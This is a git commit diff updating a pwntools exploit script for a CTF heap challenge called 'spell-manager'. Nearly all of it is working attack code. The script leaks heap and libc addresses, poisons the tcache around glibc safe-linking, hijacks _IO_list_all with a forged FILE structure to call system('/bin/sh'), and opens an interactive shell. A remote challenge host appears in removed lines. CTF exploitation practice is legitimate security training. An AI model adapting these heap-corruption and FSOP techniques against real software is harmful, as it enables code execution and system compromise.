b13ce8593c1483b8029e7f582bd91c6da8bfe26e
segfault; son of binexp; house of einherjar <zoverin@proton.me>
2025-10-07 06:48:42 -0400

    update spell-manager

--- securinets/spell-manager/xpl.py
+++ securinets/spell-manager/xpl.py
@@ -1,89 +1,74 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = context.binary = ELF(args.EXE or './main')
+exe = context.binary = ELF(args.EXE or "./main")
 libc = ELF(exe.libc.path)
 
-
-def start(argv=[], *a, **kw):
-    if args.GDB:
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
-    else:
-        return process([exe.path] + argv, *a, **kw)
-
 def create(idx, name=b"\x00", effect=b"\x00", mana_cost=0, cooldown=0, element=0):
-    io.sendlineafter(b": ", b"1")
+    io.sendlineafter(b"choice: ".capitalize(), b"1")
     io.sendlineafter(b": ", str(idx).encode())
     io.sendafter(b"name: ", name)
     io.sendafter(b"effect: ", effect)
     io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
-    io.sendlineafter(b": ", str(cooldown).encode())
+    io.sendlineafter(b"cooldown (in seconds): ", str(cooldown).encode())
     io.sendlineafter(b": ", str(element).encode())
 
-def edit(idx, name=b"\x00", effect=b"A"*64, mana_cost=0, cooldown=0, element=0):
-    io.sendlineafter(b": ", b"2")
+def edit(idx, name=b"\x00", effect=b"\x00", mana_cost=0, cooldown=0, element=0):
+    io.sendlineafter(b"choice: ".capitalize(), b"2")
     io.sendlineafter(b": ", str(idx).encode())
     io.sendafter(b"name: ", name)
     io.sendafter(b"effect: ", effect)
     io.sendlineafter(b"mana cost: ", str(mana_cost).encode())
-    io.sendlineafter(b": ", str(cooldown).encode())
+    io.sendlineafter(b"cooldown (in seconds): ", str(cooldown).encode())
     io.sendlineafter(b": ", str(element).encode())
- 
+
+def view(idx):
+    io.sendlineafter(b": ", b"3")
+    io.recvuntil(f"slot {idx}".capitalize().encode())
+    io.recvuntil(b"name: ".capitalize())
+    return io.recvline().strip()
+
 def delete(idx):
-    io.sendlineafter(b": ", b"4")
+    io.sendlineafter(b"choice: ".capitalize(), b"4")
     io.sendlineafter(b": ", str(idx).encode())
 
-gdbscript = '''
-continue
-'''.format(**locals())
+def feedback(size, data):
+    io.sendlineafter(b": ", b"5")
+    io.sendlineafter(b"size of feedback: ", str(size).encode())
+    io.sendafter(b"feedback: ", data)
 
-io = start()
-#io = remote("pwn-14caf623.p1.securinets.tn", 9091)
+io = process(exe.path)
 
-create(0, name=p64(0x0)*3 + p64(0x80))
-create(1, name=p64(0x0)*3 + p64(0x80))
+for i in range(0, 20): create(i)
+for i in range(0, 7): delete(i)
 
-for i in range(2, 20): create(i)
+heap_base = u64(view(0).ljust(8, b'\x00')) << 12
+log.info("heap base: " + hex(heap_base))
 
-delete(1)
-delete(0)
+edit(7, name=p64(0x0) + p64(0x81) + p64(heap_base >> 12))
 
-io.sendlineafter(b": ", b"3")
-io.recvuntil(b"ame: ")
-addr = u64(io.recvline().strip().ljust(8, b'\x00'))
-io.recvuntil(b"ame: ")
-key = u64(io.recvline().strip().ljust(8, b'\x00'))
+create(20)
+create(21)
+delete(21)
+delete(20)
 
+edit(20, name=p64((heap_base+0x620)^(heap_base>>12)))
 
-edit(0, name=p64(((addr^key)-96)^key))
-create(2)
+create(20)
+create(21, element=0x501)
+delete(8)
 
-edit(2, name=p64(0x0)*3 + p64(0x80))
-create(3)
+libc.address = u64(b"\x20" + view(8).ljust(7, b'\x00')) - 0x203b20
+log.info("libc base: " + hex(libc.address))
 
-edit(2, name=p64(0x0)*3 + p64(0x501))
-edit(10, name=p64(0x0)*3 + p64(0x21))
-delete(3)
+edit(21, element=0x0)
+edit(7, name=b"/bin/sh\x00".ljust(0x8, b"\x00") + p64(0)*2 + p64(libc.symbols["system"]))
+edit(8, name=p64(0) + p64(libc.address + 0x205700), effect=p64((heap_base + 0x620) - 0x20) + p64(0x0)*3 + p64(heap_base + 0x620) + p64(0x0)*2 + p64(libc.address + 0x202228 + 0x30))
 
-io.sendlineafter(b": ", b"3")
+edit(6, name=p64(libc.symbols["_IO_list_all"]^(heap_base >> 12)))
+
+feedback(108, b'A'*8)
+feedback(108, p64(heap_base + 0x620))
+
+io.sendlineafter(b"choice: ".capitalize(), b"6")
 io.interactive()
-io.recvuntil(b"lot 3:")
-io.recvuntil(b"ame: ")
-libc.address = u64(b"\x20" + io.recvline().strip().ljust(7, b'\x00')) - 0x1e7b20
-log.info(hex(libc.address))
-
-edit(0, name=b"/bin/sh\x00".ljust(0x8, b"\x00") + p64(0)*2 + p64(libc.symbols["system"]), effect=p64(0x0)*8)
-edit(1, name=p64(0) + p64(libc.address + 0x205700) + p64(0x0)*2, effect=p64((addr^key)-128-0x20) + p64(0x0)*3 + p64((addr^key)-128) + p64(0x0)*2 + p64(libc.address + 0x202228 + 0x30))
-
-
-#delete(17)
-#delete(16)
-
-#edit(16, name=p64(libc.symbols['_IO_list_all']^(((addr^key) + 1920)>>12)))
-#create(18)
-#create(19)
-#edit(19, name=p64((addr^key)-128))
-
-
-io.interactive()
-
